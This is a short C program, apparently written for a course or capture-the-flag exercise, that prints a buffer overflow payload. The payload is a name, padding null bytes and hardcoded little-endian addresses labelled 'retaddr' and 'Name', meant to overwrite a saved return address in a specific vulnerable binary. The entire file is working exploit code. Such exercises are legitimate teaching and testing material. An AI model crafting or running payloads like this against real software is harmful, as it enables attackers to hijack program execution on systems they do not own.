#include <stdio.h>

int main(void){
 int i;
 
  fputs("Charalampaki", stdout);
  for(i = 0; i < 38; i++) 
  	putchar('\0');
  putchar(56);   /* overwriten - goto retaddr */
  /* retaddr */  
  putchar(0x68);
  putchar(0x8b);
  putchar(0x04);
  putchar(0x08);
  /* Name */
  putchar(0xe0);
  putchar(0x65);
  putchar(0x0d);
  putchar(0x08);
  
  putchar('\n');
  
  return 0;
}